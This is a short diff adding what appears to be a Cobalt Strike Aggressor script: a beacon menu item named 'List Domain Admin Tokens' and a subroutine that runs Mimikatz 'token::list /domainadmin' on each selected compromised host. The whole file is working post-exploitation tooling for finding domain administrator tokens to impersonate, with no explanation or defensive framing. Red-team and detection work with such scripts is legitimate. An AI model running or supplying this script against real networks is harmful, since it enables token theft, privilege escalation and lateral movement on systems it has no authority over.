@@ -1,0 +1,12 @@
+#List Domain Admin Tokens
+item "List Domain Admin Tokens"{
+	local('$bid');
+		foreach $bid ($1){
+			listdatokens($bid);
+		}
+	}
+
+#Mimikatz List Domain Admin Tokens
+sub listdatokens{
+bmimikatz($1, "token::list /domainadmin");
+}
